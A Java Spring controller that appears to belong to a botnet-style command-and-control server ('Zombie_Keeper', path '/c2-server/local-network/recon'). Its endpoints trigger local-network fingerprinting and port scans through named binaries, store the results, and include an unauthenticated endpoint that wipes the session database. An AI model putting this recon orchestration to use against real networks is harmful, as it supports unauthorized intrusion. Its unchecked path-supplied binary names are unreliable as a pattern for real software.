package com.manager.Zombie_Keeper.controller.localNetwork;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Optional;

import org.springframework.http.MediaType;

import com.manager.Zombie_Keeper.model.entity.localNetwork.NetworkNode;
import com.manager.Zombie_Keeper.model.entity.localNetwork.NetworkSession;
import com.manager.Zombie_Keeper.repository.localNetwork.NetworkNodeRepository;
import com.manager.Zombie_Keeper.repository.localNetwork.NetworkSessionRepository;
import com.manager.Zombie_Keeper.service.localNetwork.aux.LocalNetworkDatabaseManagerService;
import com.manager.Zombie_Keeper.service.localNetwork.fingerprint.LocalNetworkFingerprintService;

import tools.jackson.databind.ObjectMapper;
import org.springframework.web.bind.annotation.RequestParam;


@RestController
@RequestMapping("/c2-server/local-network/recon")
public class ReconController {

    LocalNetworkFingerprintService localNetFp;
    NetworkSessionRepository sessionRepository;
    LocalNetworkDatabaseManagerService auxNetworkAuxsService;
    NetworkNodeRepository networkNodeRepository;


    public ReconController(LocalNetworkFingerprintService localNetFp, NetworkSessionRepository sessionRepository, 
        LocalNetworkDatabaseManagerService auxNetworkAuxsService, NetworkNodeRepository networkNodeRepository ){
        
            this.localNetFp = localNetFp;
            this.sessionRepository = sessionRepository;
            this.auxNetworkAuxsService = auxNetworkAuxsService;
            this.networkNodeRepository = networkNodeRepository;
    }
    
    /*
    *  use sec usec for struct timeval(c++) non-bloking io configuration
    *  Ex: "LocalFingerPrint", "all or any ", "0", "300000"
    */
    @GetMapping(value = "/session/{binaryName}/{flag}/{sec}/{usec}", produces = MediaType.APPLICATION_JSON_VALUE)
    public ResponseEntity<String> sessionRecon(@PathVariable String binaryName, @PathVariable String flag, 
        @PathVariable String sec, @PathVariable String usec){

        String json = localNetFp.excLocalNetFingerPrint(binaryName, flag, sec, usec);

        try {
       
        
            ObjectMapper mapper = new ObjectMapper();

            NetworkSession sessionEntity = mapper.readValue(json, NetworkSession.class);
            
            sessionEntity = auxNetworkAuxsService.updateCompleteSession(sessionEntity);

            sessionRepository.save(sessionEntity);
            
        } catch (Exception e) {

            e.printStackTrace();
            System.out.println("ERROR " + e.getMessage());
            return ResponseEntity.internalServerError().body("Internal proceess error");
        }

        return ResponseEntity.ok(json);
    }  

    @GetMapping(value = "/node/{binaryName}/{networkIdentfier}/{mac}/{ip}/{port}/{sec}/{usec}")

    public ResponseEntity<Integer> simpleScan(@PathVariable String binaryName, @PathVariable String networkIdentfier, 
        @PathVariable String mac,  @PathVariable String ip,@PathVariable String port, @PathVariable String sec, @PathVariable String usec) {


        try {
            int result = localNetFp.excLocalPortScan(binaryName, networkIdentfier, mac, ip, port, sec, usec);



            return ResponseEntity.ok(result);


        } catch (Exception e) {
           
            e.printStackTrace();
            System.out.println("ERROR " + e.getMessage());
        }   

        

        return ResponseEntity.ok(-1);

    }
    

    @GetMapping(value = "/node/{binaryName}/{mac}/{networkIdentfier}/{flag}/{sec}/{usec}", produces = MediaType.APPLICATION_JSON_VALUE)
    public ResponseEntity<String> nodeRecon(@PathVariable String binaryName, @PathVariable String networkIdentfier, 
        @PathVariable String mac,  @PathVariable String flag, @PathVariable String sec, @PathVariable String usec
    ){
        
        String json =  localNetFp.excLocalNodeFingerPrint(binaryName, mac, networkIdentfier, flag, sec, usec);
        Optional<NetworkNode> nodeDBA = networkNodeRepository.findByMacAddress(mac);
        
        System.out.println("JSON: " + json);

        boolean isEmptyScan = json.contains("\"nodes\": []") || json.contains("\"nodes\":[]");
        boolean isPingFail = json.equalsIgnoreCase("falidPing");

        if(isPingFail || isEmptyScan){
            
            if(nodeDBA.isPresent()){
                networkNodeRepository.delete(nodeDBA.get());
                System.out.println("Node off delete: ." + " mac:" + nodeDBA.get().getMacAddress() + " ip: " + nodeDBA.get().getIpAddress());
            }

            return ResponseEntity.ok("{\"status\": \"offline\", \"message\": \"Host unreachable\"}");
        }
        
        try {
          
            ObjectMapper mapper = new ObjectMapper();

            NetworkSession sessionEntity = mapper.readValue(json, NetworkSession.class);

            NetworkNode node = auxNetworkAuxsService.updateNode(sessionEntity);
            

            if(sessionRepository.findByNetworkIdentifier(networkIdentfier).isPresent()){

                if(node != null) {
                    sessionRepository.save(node.getNetwork());
                    return ResponseEntity.ok(json);
                } 

                if(networkNodeRepository.findByMacAddress(mac).isPresent() && node == null){

                   

                    networkNodeRepository.delete(nodeDBA.get());
                }

            }

        
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("ERROR " + e.getMessage());
            return ResponseEntity.internalServerError().body("Internal proceess error");
        }
        
        return ResponseEntity.ok(json);
    }

    @DeleteMapping("/admin/reset-database")
    public ResponseEntity<String> nukeDatabase() {
    
        sessionRepository.deleteAll();
    
        return ResponseEntity.ok(" Clear DBA!");
    }

}
